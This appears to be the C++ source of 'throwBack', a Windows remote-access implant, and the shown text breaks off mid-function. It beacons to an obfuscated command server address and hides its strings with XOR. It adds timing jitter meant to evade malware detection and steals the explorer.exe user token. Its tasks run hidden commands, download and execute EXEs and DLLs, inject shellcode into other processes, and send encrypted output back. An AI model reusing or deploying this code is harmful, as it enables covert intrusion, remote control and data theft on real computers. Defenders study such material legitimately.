// throwBack.cpp : Defines the entry point for the console application.

#include "stdafx.h"
#include <UrlMon.h>
#include <winhttp.h>
#include <Windows.h>
#include <ShellAPI.h>
#include <string>
#include <time.h>
#include "WinHttpClient.h"
#include <tlhelp32.h>
#include "Base64_RC4.h"
#include "Throwback.h"
#include "LoadLibraryR.h"
#include <WinSock.h>

using namespace std;

extern "C" HANDLE __stdcall LoadRemoteLibraryR(HANDLE hProcess, LPVOID lpBuffer, DWORD dwLength, LPVOID lpParameter);

////////////////// CONFIGURABLE SETTINGS BEGIN //////////////////

//UNCOMMENT TO DEBUG PROXY
//#define DEBUGPROXY

//SLEEP TIME WHEN DNS FAILS TO RESOLVE
#ifndef _DEBUG
int DNSERROR = 900; //IN SECONDS = 15 MINUTES
#else
int DNSERROR = 5;
#endif

//CODE IN THE HTML TO DENOTE TASKS FOLLOW
// stup1fy
int COMMANDCODE[] = {34,37,36,33,96,55,40}; 

//MAX LENGTH OF EACH DNS NAME
const int DNSCODESIZE = 60;

//MAX SIZE OF DNS NAME ARRAY
const int DNSARRAY = 2;

//ARRAY TO HOLD THE ENCODED URLS TO CALL BACK TO!
//DNSARRAY AND DNSCODESIZE MUST MATCH THIS ARRAY! - EACH ARRAY MUST END WITH -1 SO THE STRING DECRYPTER KNOWS WHEN THE STRING IS COMPLETE!!!

// https://192.168.20.133/index.php
int DNSCODE[DNSARRAY][DNSCODESIZE] = {{57,37,37,33,34,107,126,126,96,104,99,127,96,103,105,127,99,97,127,96,98,98,126,56,63,53,52,41,127,33,57,33,-1}, {57,37,37,33,34,107,126,126,96,104,99,127,96,103,105,127,99,97,127,96,98,98,126,56,63,53,52,41,127,33,57,33,-1}};

//0 = LINEAR SELECTION OF LPs; 1 = RANDOM SELECTION OF LPs
bool RCONNECTION = 1;

////////////////// CONFIGURABLE SETTINGS END //////////////////

//ARRAY OF ASCII CHARS
wchar_t ASCIICHARS[256];

//KEY FOR RC4 ENCRYPTION
const char *RC4KEY = "ZAQwsxcde321";

//DEFAULT CB TIME IS NOT UPDATED
int cbTimeUpdated = 0;

//USED TO PREVENT BASE64 FROM GETTING JACKED UP
const wchar_t GOODCHAR = '~';
const wchar_t BADCHAR = '+';

//ALL THE POST VARIABLES ARE STORED HERE
wstring urlVars;

// STRUCTURE FOR INTERNET SETTINGS
struct WINHTTPCONNECT 
{  
	bool connectionValid;
	int connectionType;
	int connectionNumber;
	wstring proxyConfig;
	wstring sUrl;
}; 

//FUNCTION DECLARATIONS
int copyX(wchar_t *,  wstring);
bool setupConnection(WINHTTPCONNECT &);
bool findProxyConfig(WINHTTPCONNECT &);
WinHttpClient setupHttpClient(WINHTTPCONNECT &);
string preparePost(wstring);

//START OF CODE
int enableSEPrivilege(LPCTSTR name) 
{
	HANDLE hToken;
	LUID luid;
	TOKEN_PRIVILEGES tkp;

	if(!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken)) return 0;

    if(!LookupPrivilegeValue(NULL, name, &luid)) return 0;

	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Luid = luid;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if(!AdjustTokenPrivileges(hToken, false, &tkp, sizeof(tkp), NULL, NULL)) return 0;

	if(GetLastError() == ERROR_NOT_ALL_ASSIGNED) return 0;

	CloseHandle(hToken);
	return 1;
}


DWORD findPid(wchar_t *procName)
{
	DWORD tPid = 0;
	DWORD res = 0;
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);
	wstring pName = procName;
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if(pName.find(L"\\") != -1)
	{
		int begin = pName.find_last_of(L"\\");
		pName = pName.substr(begin + 1, pName.length());
	}

	//FIND PID OF PROCESS
	if(Process32First(snapshot, &entry) == TRUE)
	{
		while(Process32Next(snapshot, &entry) == TRUE)
		{
			if(wcscmp(entry.szExeFile, pName.c_str()) == 0)
			{  
				tPid = entry.th32ProcessID;
				break;
			}
		}
	}
	CloseHandle(snapshot);
	return tPid;
}


HANDLE duplicateToken()
{
	int r = enableSEPrivilege(SE_RESTORE_NAME);
	r = enableSEPrivilege(SE_CREATE_TOKEN_NAME);
	r = enableSEPrivilege(SE_IMPERSONATE_NAME);
	r = enableSEPrivilege(SE_CREATE_TOKEN_NAME);

	HANDLE hPToken = NULL;
	HANDLE hProcToken;
	HANDLE hDupToken;

	//GET A HANDLE TO PROCESS
	DWORD hPid = findPid(L"explorer.exe");
	if(hPid == 0) return NULL;

	hProcToken = OpenProcess(MAXIMUM_ALLOWED, FALSE, hPid);
	DWORD res = GetLastError(); 

	if(hProcToken != NULL) 	
	{
		//OPEN TARGET PROCESS TO OBTAIN USER TOKEN
		OpenProcessToken(hProcToken, TOKEN_DUPLICATE|TOKEN_ASSIGN_PRIMARY|TOKEN_ADJUST_SESSIONID|TOKEN_READ|TOKEN_WRITE, &hPToken);

		if(hPToken != 0) 
		{
			//DUPLICATE USER TOKEN
			if(DuplicateTokenEx(hPToken, MAXIMUM_ALLOWED, NULL, SecurityIdentification, TokenPrimary, &hDupToken) != 0)
			{
				//IMPERSONATE USER 
				res = ImpersonateLoggedOnUser(hDupToken);
				res = GetLastError();
			}
			CloseHandle(hPToken);
		}
		CloseHandle(hProcToken);
	}
	return hDupToken;
}


int revToSelf()
{
	if(RevertToSelf()) return 1;
	else return 0;
}


wstring decryptString(int codeString[], int codeLength)
{
	int count = 0;
	wstring temp = L"";

	int xKey = 'Q';
	count = 0;
	
	while(count < codeLength)
	{
		int k = 0;
		if (codeString[count] == -1) break;
		else
		{
			k = xKey;
			temp += (codeString[count] ^ k) % 255;
		}
		count++;
	}
	return temp.c_str();
}


//SLEEP FOR SPECIFIED DELAY
void sleepDelay(int seconds)
{
	//ADD SOME VARIATION TO EVADE BASIC MALWARE DETECTION
	double r = (double)rand() / RAND_MAX;
	double s = seconds * (.9 + r * (1.1 - .9));
	Sleep(s * 1000);
}


//INJECT SHELLCODE
int injectShellCode(HANDLE hProcess, LPVOID lpBuffer, DWORD dwLength)
{
	BOOL bSuccess = FALSE;
	LPVOID lpRemoteLibraryBuffer = NULL;
	DWORD dwThreadId = 0;
	DWORD dwResult = 0;
	HANDLE hThread = NULL;
	PRTL_CREATE_USER_THREAD RtlCreateUserThread = NULL;

	__try
	{
		do
		{
			if( !hProcess  || !lpBuffer || !dwLength ) break;
			
			//OutputDebugString("ATTEMPING INJECTION!");
			lpRemoteLibraryBuffer = VirtualAllocEx( hProcess, NULL, dwLength, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE ); 
			if( !lpRemoteLibraryBuffer )
			{
				//OutputDebugString(L"VirtualAllocEx FAILED!");
				break;
			}

			// write the image into the host process...
			if (!WriteProcessMemory(hProcess, lpRemoteLibraryBuffer, lpBuffer, dwLength, NULL))
			{
				//OutputDebugString(L"WriteProcessMemory FAILED!");
				break;
			}
			
			//OutputDebugString(L"INJECTING DLL!");
			
			DWORD ThreadID;
			hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpRemoteLibraryBuffer, 0, 0, &ThreadID);

			if(GetLastError() == ERROR_NOT_ENOUGH_MEMORY)
			{
				RtlCreateUserThread = (PRTL_CREATE_USER_THREAD)(GetProcAddress(GetModuleHandle(L"ntdll"), "RtlCreateUserThread"));
				
				if(RtlCreateUserThread) RtlCreateUserThread(hProcess, NULL, 0, 0, 0, 0, (LPTHREAD_START_ROUTINE)lpRemoteLibraryBuffer, 0, &hThread, NULL);
				else
				{
					VirtualFree(lpRemoteLibraryBuffer, dwLength, 0);
					return 1;
				}

				if(hThread == NULL) 
				{
					OutputDebugStringA("INJECTION FAILED!"); 
					return 1;
				}
			}
		} while( 0 );

	}
	__except(EXCEPTION_EXECUTE_HANDLER)
	{
		
		hThread = NULL;
	}

	return 0;


}




/**
//INJECT SHELLCODE DIRECTLY INTO MEMORY
int injectShellCode(wstring wBase64, int runas, int procID)
{
	if(wBase64.length() > 1024 || wBase64.length() < 128) return 13; 

	//OPEN PROCESS
	HANDLE hHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procID);
	if(hHandle == INVALID_HANDLE_VALUE) return 13;

	//CONVERT WIDE TO CHAR
	char *b64 = new char[wBase64.length() + 1];
	b64[wBase64.length()] = '\0';
	WideCharToMultiByte(CP_ACP, 0, wBase64.c_str(), -1, b64, wBase64.length(), NULL, NULL);
	
	//DESTINATION BUFFER
	char abuf[1024];
	memset(abuf, 0, 1024);

	//BASE64 COMMAND RESULTS
	CBase64 base64;
	base64.Decrypt(b64, wBase64.length(), abuf);
	delete[] b64;

	//DWORD procSize = scCode.length();
	DWORD bufLen = strlen(abuf);

	LPVOID lpProc = VirtualAllocEx(hHandle, 0, bufLen, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	//LPVOID lpProc = VirtualAllocEx(hHandle, 0, wBase64.length(), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	LPVOID lpParams = VirtualAllocEx(hHandle, 0, 1024, MEM_COMMIT, PAGE_READWRITE);

	if(!lpProc || !lpParams) return 13;
	
	//WRITE SHELLCODE TO MEMORY
	DWORD dwWritten;
	if(WriteProcessMemory(hHandle, lpProc, &abuf, bufLen, (SIZE_T *)&dwWritten) == 0) return 13;
	//if(WriteProcessMemory(hHandle, lpProc, &b64, wBase64.length(), (SIZE_T *)&dwWritten) == 0) return 13;
	
	//CREATE THE REMOTE THREAD
	DWORD ThreadID;
	HANDLE hThread = CreateRemoteThread(hHandle, NULL, 0, (LPTHREAD_START_ROUTINE)lpProc, lpParams, 0, &ThreadID);

	if (hThread == NULL) return 13;
	else WaitForSingleObject(hThread, 2000);

	VirtualFreeEx(hHandle, lpProc, bufLen, MEM_DECOMMIT);
	//VirtualFreeEx(hHandle, lpProc, wBase64.length(), MEM_DECOMMIT);
	VirtualFreeEx(hHandle, lpParams, 1024, MEM_DECOMMIT);

	CloseHandle(hHandle);
	return 0;
}
**/

//RUN COMMAND RETURN OUTPUT
wstring runCommand(wstring command, wstring args, int dToken)
{
	HANDLE hDupToken = NULL;

	//IF dToken IS SET, THEN IMPLANT IS RUNNING AS SYSTEM AND MUST DUPLICATE TOKEN OF USER
	//THIS IS NEEDED TO CREATE PROCESSES THAT REQUIRE USER PROXY SETTINGS...LIKE THE METERPRETER CALLBACK
	if(dToken == 1) 
	{
		hDupToken = duplicateToken();
		if(hDupToken == NULL) return L"14";
	}

	wstring retString = L"0";
	SECURITY_ATTRIBUTES secattr; 
	ZeroMemory(&secattr,sizeof(secattr));
	secattr.nLength = sizeof(secattr);
	secattr.bInheritHandle = true;

	HANDLE rPipe, wPipe;
	CreatePipe(&rPipe, &wPipe, &secattr, 0);

	STARTUPINFO sInfo;
	ZeroMemory(&sInfo, sizeof(sInfo));
	sInfo.cb = sizeof(sInfo);
	sInfo.dwFlags = STARTF_USESTDHANDLES;
	sInfo.lpDesktop = NULL;
	sInfo.hStdInput = NULL;
	sInfo.hStdOutput = wPipe; 
	sInfo.hStdError = wPipe;
	sInfo.wShowWindow = SW_HIDE;
	
	PROCESS_INFORMATION pInfo;
	ZeroMemory(&pInfo, sizeof(pInfo));
	DWORD ret = 0;
	
	if(args.length() == 0)
	{
		if(dToken == 0) ret = CreateProcess(command.c_str(), 0, 0, 0, true, NORMAL_PRIORITY_CLASS|CREATE_NO_WINDOW, 0, 0, &sInfo, &pInfo);
		else if(dToken == 1) ret = CreateProcessAsUser(hDupToken, (LPWSTR)command.c_str(), 0, 0, 0, true, NORMAL_PRIORITY_CLASS|CREATE_NO_WINDOW, 0, 0, &sInfo, &pInfo);
	}
	else
	{
		command.append(L" ");
		command.append(args.c_str());
		if(dToken == 0) ret = CreateProcess(0, (LPWSTR)command.c_str(), 0, 0, true, NORMAL_PRIORITY_CLASS|CREATE_NO_WINDOW, 0, 0, &sInfo, &pInfo);
		else if(dToken == 1)
		{
			ret = CreateProcessAsUser(hDupToken, 0, (LPWSTR)command.c_str(), 0, 0, true, NORMAL_PRIORITY_CLASS|CREATE_NO_WINDOW, 0, 0, &sInfo, &pInfo);
			//CREATEPROCESSASUSER RETURNS 0 FOR SUCCESS SO MAKE IT 1 LIKE CREATEPROCESS IF SUCCESSFUL
			if(ret == 0) ret = 1;
		}
	}
	
	string temp;

	//9 = UNABLE TO CREATE PROCESS
	if(ret != 1)
	{
		retString = L"9";
	}
	else
	{
		CloseHandle(wPipe);

		//WAIT FOR OBJECT TO FINISH
		WaitForSingleObject(pInfo.hProcess, 10000);
		DWORD reDword;

		//CHECK IF PIPE IS EMPTY
		if(PeekNamedPipe(rPipe, NULL, NULL, NULL, &reDword, NULL))
		{
			//IF ITS NOT EMPTY PULL STDOUT FROM THE PIPE
			if(reDword != 0)
			{
				char buf[256];
				BOOL res;
				
				do
				{
					string t;
					res = ::ReadFile(rPipe, buf, sizeof(buf), &reDword, 0);
					t = buf;
					//CUT OFF THE CRAP AT THE END
					temp.append(t.substr(0,reDword));

				}while(res);
			//8 = PROCESS IS STILL RUNNING OR RETURNED NO OUTPUT
			}else retString = L"8";
		//8 = PROCESS IS STILL RUNNING OR RETURNED NO OUTPUT
		}else retString = L"8";
	}

	if(temp.length() > 0)
	{
		wchar_t *wszTo = new wchar_t[temp.length() + 1];
		wszTo[temp.size()] = L'\0';
		MultiByteToWideChar(CP_ACP, 0, temp.c_str(), -1, wszTo, temp.length());
		retString = wszTo;
		delete[] wszTo;
	}

	if(hDupToken != NULL) CloseHandle(hDupToken);
	if(dToken == 1) revToSelf();

	return retString;
}

/**
int copyX(wchar_t *origin, wchar_t *destination)
{
	int ret = 1;
	
	//DELETE FILE IF IT EXISTS
	if(GetFileAttributes(destination) != INVALID_FILE_ATTRIBUTES)
	{
		SetFileAttributes(destination, FILE_ATTRIBUTE_NORMAL);
		DeleteFile(destination);
	}
	
	//AV FLAGGED HERE - USED CopyFile BEFORE!
	ret = CopyFileEx(origin, destination, NULL, NULL, NULL, NULL); 
	
	//NOW COPY FILE
	if(ret != 0) ret = 0; //COPY SUCCESSFUL
	else ret = 1; //COPY UNSUCCESSFUL - PERMISSIONS(5) OR ALREADY RUNNING(32)!
	
	SetFileAttributes(destination, FILE_ATTRIBUTE_HIDDEN);
	
	return ret;
}
**/


//SET PROXY CONFIGURATION WHICH IS STORED IN hConnect AT STARTUP
void setProxyConfig(WinHttpClient &hClient, WINHTTPCONNECT &hConnect)
{

	//SET CONNECTION INFO
	//1 | 3 = PROXY SERVER
	if(hConnect.connectionType == 1 || hConnect.connectionType == 3)
	{
		hClient.SetProxy(hConnect.proxyConfig);
		hClient.SetProxyUrl(L"");
	}
	//2 | 4 = WPAD URL
	else if(hConnect.connectionType == 2 || hConnect.connectionType == 4)
	{
		hClient.SetProxy(L"");
		hClient.SetProxyUrl(hConnect.proxyConfig);
	}
	//0 = DIRECT CONNECTION
	else if(hConnect.connectionType == 0)
	{
		hClient.SetProxy(L"");
		hClient.SetProxyUrl(L"");
	}
	return;
}


int downloadFile(wchar_t *url, wchar_t *destination, WINHTTPCONNECT &hConnect)
{
	//SETUP HTTP CLIENT
	WinHttpClient tClient(url);
	
	//SETUP PROXY CONFIG
	setProxyConfig(tClient, hConnect);
	
	//DON'T REQUIRE VALID CERT
	tClient.SetRequireValidSslCertificates(false);

	//FORCE PROXY REFRESH
	tClient.SetAdditionalRequestHeaders(L"Pragma: no-cache\r\n");

	//SEND REQUEST
	tClient.SendHttpRequest();

	//MAKE SURE STATUS CODE IS GOOD
	if(tClient.m_statusCode != L"200") return 1;

	//SLEEP FOR DOWNLOAD TO COMPLETE
	sleepDelay(5); //KIND OF GHETTO...JUST TO MAKE SURE ENOUGH DOWNLOAD TIME

	//while(hClient.
	if(tClient.SaveResponseToFile(destination) == false) return 1;

	return 0;
}


wstring getHostName() 
{ 	
	wchar_t cName[256];
	DWORD length = 256;
	GetComputerName(cName, &length);
	wstring hn = cName;
	return hn;
}


int sendData(WINHTTPCONNECT &hConnect, wchar_t *commandResult, wchar_t *pk)
{
	wstring pData = urlVars;

	//MATCHING KEY
	// &pk=
	int pkInt[] = {119,33,58,108};
	pData.append(decryptString(pkInt, (sizeof(pkInt)/sizeof(int))));
	pData.append(pk);

	//RESULTS
	// &res=
	int resInt[] = {119,35,52,34,108};
	pData.append(decryptString(resInt, (sizeof(resInt)/sizeof(int))));
	
	//CONVERT WIDE TO CHAR
	char *commandRes = new char[wcslen(commandResult) + 1];
	commandRes[wcslen(commandResult)] = '\0';
	WideCharToMultiByte(CP_ACP, 0, commandResult, -1, commandRes, wcslen(commandResult), NULL, NULL);
	
	//BASE64 COMMAND RESULTS
	CBase64 base64;
	char *b64CommandRes = new char[base64.B64_length(strlen(commandRes)) + 1];
	if(b64CommandRes == NULL) return 1;
	base64.Encrypt(commandRes, strlen(commandRes), b64CommandRes);

	//CONVERT BACK TO WIDE - I HATE THIS!
	wchar_t *b64Wchar = new wchar_t[strlen(b64CommandRes) + 1];
	b64Wchar[strlen(b64CommandRes)] = '\0';
	MultiByteToWideChar(CP_ACP, 0, b64CommandRes, -1, b64Wchar, strlen(b64CommandRes));

	//NOW APPEND TO POST DATA
	pData.append(b64Wchar);

	while(true)
	{
		int found = pData.find(BADCHAR);
		if(found != -1) pData[found] = GOODCHAR;
		else break;
	}
	
	string aData = preparePost(pData);

	/**
	//CONVERT POST DATA TO MB
	char *aTmp = new char[pData.length() + 1];
	aTmp[pData.length()] = '\0';
	WideCharToMultiByte(CP_ACP, 0, pData.c_str(), -1, aTmp, pData.length(), NULL, NULL);

	//ENCRYPT POST DATA
	CRC4 rc4;
	rc4.Encrypt(aTmp, RC4KEY);

	//BASE64 ENCODE POST DATA AFTER ENCODING
	char *dst = new char[base64.B64_length(strlen(aTmp)) + 1];
	if(dst == NULL) return 1;
	base64.Encrypt(aTmp, strlen(aTmp), dst);
	string aData = "pd=";
	aData.append(dst);

	//CHANGE ALL '+' TO '~' --> THE '+' IN THE URL JACKS UP THE DECODING
	while (true)
	{
		int found = aData.find(BADCHAR);
		if(found != -1) aData[found] = GOODCHAR;
		else break;
	}
	**/

	//CREATE URL TO POST RESULTS
	//wstring sendUrl = hConnect.sUrl;
	//sendUrl.append(decryptString(PHPTASKING, (sizeof(PHPTASKING)/sizeof(int))));
	
	//SETUP HTTP CLIENT
	WinHttpClient tClient(hConnect.sUrl);
	
	//SETUP PROXY CONFIG
	setProxyConfig(tClient, hConnect);
	
	//DON'T REQUIRE VALID CERT
	tClient.SetRequireValidSslCertificates(false);

	//ADD POST VARS TO REQUEST
	tClient.SetAdditionalDataToSend((BYTE *)aData.c_str(), aData.length());

	//ADD POST CONTENT HEADERS
	wstring pHeaders = L"Content-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\nPragma: no-cache\r\n";
	wchar_t szHeaders[MAX_PATH * 10] = L"";
	swprintf_s(szHeaders, MAX_PATH * 10, pHeaders.c_str(), aData.length());
	tClient.SetAdditionalRequestHeaders(szHeaders);

	//SEND REQUEST
	tClient.SendHttpRequest(L"POST", true);
	
	//CLEAN UP!
	delete[] commandRes;
	delete[] b64CommandRes;
	delete[] b64Wchar;

	//CHECK STATUS CODE
	if(tClient.m_statusCode != L"200") return 1;
	else return 0;
}


int updateCallBack(LPCWSTR callBack)
{
	try
	{
		DEFAULTTIMEOUT = _wtoi(callBack)  * 60; 
	}
	catch(...)
	{
		DEFAULTTIMEOUT = 1800;
		return 1;
	}

	cbTimeUpdated = 1;
	return 0;
}

string preparePost(wstring pData)
{
	//CONVERT POST DATA TO MB
	char *aTmp = new char[pData.length() + 1];
	aTmp[pData.length()] = '\0';
	WideCharToMultiByte(CP_ACP, 0, pData.c_str(), -1, aTmp, pData.length(), NULL, NULL);
	
	//ENCRYPT POST DATA
	CRC4 rc4;
	rc4.Encrypt(aTmp, RC4KEY);

	//BASE64 ENCODE POST DATA 
	CBase64  base64;
	char *dst = new char[base64.B64_length(strlen(aTmp)) + 1];
	if(dst == NULL) return "-1";
	base64.Encrypt(aTmp, strlen(aTmp), dst);

	string aData = "pd=";
	aData.append(dst);

	//CHANGE ALL '+' TO '~' --> THE '+' IN THE URL JACKS UP THE DECODING
	while (true)
	{
		int found = aData.find(BADCHAR);
		if(found != -1) aData[found] = GOODCHAR;
		else break;
	}

	//CLEAN UP AND RETURN
	delete[] dst;
	delete[] aTmp;
	return aData;
}


wstring retrieveData(WINHTTPCONNECT &hConnect)
{
	wstring pData = L"";
	//OutputDebugString(L"RETRIEVING HTML KEY!");

	//ADD OTHER VARIABLES (hn, un, id)
	pData = urlVars;

	//ADD POST VARIABLE FOR PROXY STATUS
	if(hConnect.connectionType != 0) 
	{
		// &pe=
		int proxyCode[] = {119,33,52,108};
		pData.append(decryptString(proxyCode, (sizeof(proxyCode)/sizeof(int))));
		pData.append(L"1");
	}

	//TELL LP CALLBACK TIME IS NOT MODIFIED
	if(cbTimeUpdated == 0) 
	{
		// &cb=
		int cbTimeCode[] = {119,50,51,108};
		pData.append(decryptString(cbTimeCode, (sizeof(cbTimeCode)/sizeof(int))));
		pData.append(L"1");
	}

	//PREPARE POST - BASE64, ENCRYPT, ETC.
	string aData = preparePost(pData);
	
	//CREATE URL TO RETRIEVE TASKS
	//wstring retrieveUrl = hConnect.sUrl;
	//retrieveUrl.append(decryptString(PHPTASKING, (sizeof(PHPTASKING)/sizeof(int))));

	//SETUP HTTP CLIENT
	WinHttpClient tClient(hConnect.sUrl);
	
	//SETUP PROXY CONFIG
	setProxyConfig(tClient, hConnect);
	
	//DON'T REQUIRE VALID CERT
	tClient.SetRequireValidSslCertificates(false);

	//ADD POST VARS TO REQUEST
	tClient.SetAdditionalDataToSend((BYTE *)aData.c_str(), aData.size());

	//ADD POST HEADERS TO REQUEST
	wstring pHeaders = L"Content-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\nPragma: no-cache\r\n";
	wchar_t szHeaders[MAX_PATH * 10] = L"";
	swprintf_s(szHeaders, MAX_PATH * 10, pHeaders.c_str(), aData.size());
	tClient.SetAdditionalRequestHeaders(szHeaders);

	//SEND REQUEST
	tClient.SendHttpRequest(L"POST", true);
	
	//RETURN -1 IF STATUS CODE IS NOT 200-OK
	if(tClient.m_statusCode != L"200")
	{
		//OutputDebugString(L"STATUS NOT 200! RETRYING...");
		tClient.SendHttpRequest(L"POST", true);
		
		if(tClient.m_statusCode != L"200")
		{
			//OutputDebugString(tClient.m_statusCode.c_str());
			return L"-1";
		}
	}

	//RETRIEVE CONTENT
	wstring rResponse = tClient.GetResponseContent();

	//KEY IN HTML
	wstring lpKey = decryptString(COMMANDCODE, (sizeof(COMMANDCODE)/sizeof(int)));

	wchar_t *ENDER = L">";

	//CHECK IF KEY IS PRESENT
	int found1 = rResponse.find(lpKey.c_str());

	//RETURN THE STRING IF KEY IS PRESENT
	if(found1 != -1)
	{
		int found2 = rResponse.find(ENDER, found1);
		rResponse = rResponse.substr(found1+lpKey.length(), found2-found1-lpKey.length());
		//OutputDebugString(L"KEY FOUND!");
	}
	else
	{
		//NO KEY FOUND!! WEIRD!!
		//OutputDebugString(L"KEY NOT FOUND IN HTML!");
		return L"-1";
	}

	return rResponse;
}


int parseRequest(wstring command, WINHTTPCONNECT &hConnect)
{
	const wchar_t DELIMITER = '&';
	const int NUM_ARGS = 6;

	//FIND THE END
	int retInt = 0;

	//COUNT NUMBER OF DELIMITERS
	int count = 0;
	for (int i = 0; i < command.length(); i++)
	{
		if(command[i] == DELIMITER)
		{
			count++;
		}
	}
			
	//PARSE REQUEST
	int todo;
	int position;
	wstring prog;
	wstring args;
	wstring pk;
	int runas;
			
	try 
	{
		//PULL OUT ACTION
		position = command.find(DELIMITER);
		todo = _wtoi(command.substr(0, position).c_str());

		command = command.substr(position + 1, command.length() - position);
			
		//PULL OUT PK
		position = command.find(DELIMITER);
		pk = command.substr(0, position).c_str();
		command = command.substr(position + 1, command.length() - position);

		//PULL OUT COMMAND
		position = command.find(DELIMITER);
		prog = command.substr(0, position);
		command = command.substr(position + 1, command.length() - position);

		//PULL OUT ARGS
		position = command.find(DELIMITER);
		args = command.substr(0, position);
		command = command.substr(position + 1, command.length() - position);

		//PULL OUT RUNAS CHECKBOX
		position = command.find(DELIMITER);
		runas = _wtoi(command.substr(0, position).c_str());

		//VERIFY COUNT TO MAKE SURE REQUEST IS VALID
		if(count != NUM_ARGS)
		{
			//10 IS MALFORMED DATA
			retInt = 10;
			retInt = sendData(hConnect, L"10", (wchar_t *)pk.c_str());
			return retInt;
		}

		wstring commandResult;

		if(todo == 0)
		{
			retInt = 10;
		}
		//EXECUTE EXE
		else if(todo == 1)
		{
			commandResult = runCommand(prog, args, runas);
			
			//POST OUTPUT
			retInt = sendData(hConnect, (wchar_t *)commandResult.c_str(), (wchar_t *)pk.c_str());

		}
		//DOWNLOAD AND EXECUTE EXE
		else if(todo == 2) 
		{
			retInt = downloadFile((wchar_t *)prog.c_str(), (wchar_t *)args.c_str(), hConnect);

			if(retInt == 0)
			{
				commandResult = runCommand(args, L"", runas);
			
				//POST OUTPUT
				retInt = sendData(hConnect, (wchar_t *)commandResult.c_str(), (wchar_t *)pk.c_str());
			}
			else
			{
				//3 = DOWNLOAD FAILED
				retInt = sendData(hConnect, L"3", (wchar_t *)pk.c_str());
			}
		}
		//DOWNLOAD A FILE
		else if(todo == 3) 
		{
			retInt = downloadFile((wchar_t *)prog.c_str(), (wchar_t *)args.c_str(), hConnect);

			if(retInt == 0)
			{
				commandResult = L"0";
				retInt = sendData(hConnect, (wchar_t *)commandResult.c_str(), (wchar_t *)pk.c_str());
			}
			else
			{
				//3 = DOWNLOAD FAILED
				retInt = sendData(hConnect, L"3", (wchar_t *)pk.c_str());
			}
		}
		//DOWNLOAD AND EXECUTE DLL
		else if(todo == 4)
		{
			retInt = downloadFile((wchar_t *)prog.c_str(), (wchar_t *)args.c_str(), hConnect);
			
			if(retInt == 0)
			{
				// ,DllMain@12 - DEFAULT ENTRY POINT FOR METERPRETER DLLS - FIND A WAY TO MAKE THIS MODIFIABLE
				int dllMain[] = {125,21,61,61,28,48,56,63,17,96,99};
				args.append(decryptString(dllMain, (sizeof(dllMain)/sizeof(int))));
				commandResult = runCommand(L"rundll32.exe", args, runas);

				//POST OUTPUT
				retInt = sendData(hConnect, (wchar_t *)commandResult.c_str(), (wchar_t *)pk.c_str());
			}
			else
			{
				//3 = DOWNLOAD FAILED
				retInt = sendData(hConnect, L"3", (wchar_t *)pk.c_str());
			}
		}
		//SET CB TIME
		else if(todo == 5)
		{
			retInt = updateCallBack((wchar_t *)prog.c_str());
			if(retInt == 0) retInt = sendData(hConnect, L"0", (wchar_t *)pk.c_str());
			else  retInt = sendData(hConnect, L"1", (wchar_t *)pk.c_str());
		}
		//UPGRADE IMPLANT
		else if(todo == 6)
		{
			retInt = downloadFile((wchar_t *)prog.c_str(), (wchar_t *)args.c_str(), hConnect);

			if(retInt == 0)
			{	
				//START NEW VERSION
				commandResult = runCommand(args, L"", runas);
						
				if(commandResult == L"8")
				{
					retInt = sendData(hConnect, L"0", (wchar_t *)pk.c_str());
					exit(0);
				}
				//9 = FAILED TO START PROGRAM
				else retInt = sendData(hConnect, L"9", (wchar_t *)pk.c_str());

			}
			//3 = DOWNLOAD FAILED
			else retInt = sendData(hConnect, L"3", (wchar_t *)pk.c_str());
		}
		//UNINSTALL IMPLANT
		else if(todo == 7)
		{
			retInt = UninstallTB();
			
			//NO ERRORS!
			if(retInt == 0)
			{
				retInt = sendData(hConnect, L"0", (wchar_t *)pk.c_str());
				exit(0);
			}
			//ERROR UNINSTALLING!!
			else retInt = sendData(hConnect, L"11", (wchar_t *)pk.c_str());
		}
		//INSTALL SERVICE - REMOVED THIS FEATURE...NOT NEEDED
		else if(todo == 8)
		{
			retInt = sendData(hConnect, L"15", (wchar_t *)pk.c_str());
		}
		//EXECUTE SHELLCODE
		else if(todo == 9)
		{
			//SETUP HTTP CLIENT
			WinHttpClient tClient(prog.c_str());
	
			//SETUP PROXY CONFIG
			setProxyConfig(tClient, hConnect);
	
			//DON'T REQUIRE VALID CERT
			tClient.SetRequireValidSslCertificates(false);

			//FORCE PROXY REFRESH
			tClient.SetAdditionalRequestHeaders(L"Pragma: no-cache\r\n");

			//SEND REQUEST TO DOWNLOAD SC...EMBEDDED IN HTML
			tClient.SendHttpRequest();
			wstring scString;

			//RETURN CONTENT
			if(tClient.m_statusCode == L"200") scString = tClient.GetResponseContent();

			//BASIC ERROR CHECKING - SHELLCODE MUST BE > 225 BYTES
			if(scString.length() > 200)
			{
				//START HIDDEN PROCESS FOR SHELLCODE INJECTION
				DWORD pID = 0;

				try
				{
					pID = _wtoi(args.c_str());
					
				}
				catch(...)
				{
					pID = 0;
				}

				if(pID != 0)
				{
					HANDLE hHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pID);
					if(hHandle == INVALID_HANDLE_VALUE) retInt = 13;
					else
					{
						//CONVERT WIDE TO CHAR
						char *b64 = new char[scString.length() + 1];
						memset(b64, 0, scString.length() + 1);
						WideCharToMultiByte(CP_ACP, 0, scString.c_str(), -1, (LPSTR)b64, scString.length(), NULL, NULL);
	
						//BASE64 COMMAND RESULTS
						CBase64 base64;
						DWORD scLen = base64.Ascii_length(scString.length());
						//DESTINATION BUFFER
						LPVOID *abuf = new LPVOID[scLen + 1];
						memset(abuf, 0, scLen + 1);

						base64.Decrypt(b64, scString.length(), (char *)abuf);
						
						retInt = injectShellCode(hHandle, abuf, scLen);

						CloseHandle(hHandle);
						if(b64) delete b64;
						if(abuf) delete abuf;

					}

				}
				else retInt = 13;

				//POST RESULTS
				if(retInt == 0)
				{
					//OutputDebugString(L"INJECTED");
